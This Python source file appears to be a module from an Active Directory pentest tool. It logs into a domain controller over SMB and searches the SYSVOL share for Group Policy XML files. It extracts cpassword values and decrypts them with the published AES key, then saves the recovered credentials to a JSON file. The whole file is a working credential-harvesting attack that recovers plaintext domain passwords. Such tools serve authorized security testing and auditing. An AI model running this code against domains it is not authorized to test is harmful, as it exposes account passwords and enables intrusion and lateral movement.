import re, os, base64, json
from termcolor import colored
from Cryptodome.Cipher import AES
from impacket import smbconnection
from impacket.smbconnection import SessionError
from ldap3.core.exceptions import LDAPKeyError
from impacket.nmb import NetBIOSTimeout, NetBIOSError


class EnumSYSVOL():

    def __init__(self, server, user, passwd):
        self.server = server
        self.domuser = user
        self.passwd = passwd
        self.checkSYSVOL()


    def checkSYSVOL(self):
        print('[ .. ] Searching SYSVOL for cpasswords\r')
        cpasswords = {}
        try:
            smbconn = smbconnection.SMBConnection('\\\\{0}\\'.format(self.server), self.server, timeout=5)
            smbconn.login(self.domuser, self.passwd)
            dirs = smbconn.listShares()
            for share in dirs:
                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
                    for dirname in paths:
                        try:
                            # Dont want . or ..
                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                            for sub in subPath:
                                if len(sub.get_shortname()) > 2:
                                    paths.append(dirname + '\\' + sub.get_shortname())
                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                            continue
                
                    # Compile regexes for username and passwords
                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')

                    # Prepare the ciphers based on MSDN article with key and IV
                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
                
                    # Since the first entry is the DC we dont want that
                    for item in paths[1:]:
                        if '.xml' in item.split('\\')[-1]:
                            print('item .xml: ' + str(item))
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                                try:
                                    fileContent = f.read()
                                    passwdMatch = cpassRE.findall(str(fileContent))
                                    for passwd in passwdMatch:
                                        unameMatch = unameRE.findall(str(fileContent))
                                        for usr in unameMatch:
                                            padding = '=' * (4 - len(passwd) % 4) 
                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
                                except (UnicodeDecodeError, AttributeError) as e:
                                    # Remove the files we had to write during the search
                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
                                    continue

                            # Remove the files we had to write during the search
                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))

            if len(cpasswords.keys()) > 0:
                with open('{0}-cpasswords.json'.format(self.server), 'w') as f:
                    json.dump(cpasswords, f)

            if len(cpasswords.keys()) == 1:
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpassword in a GPO on SYSVOL share'.format(len(cpasswords.keys())))
            else:
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpasswords in GPOs on SYSVOL share'.format(len(cpasswords.keys())))


        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
            print('[ ' + colored('ERROR', 'red') +' ] Some error occoured while searching SYSVOL'.format(self.server))
        else:
            smbconn.close()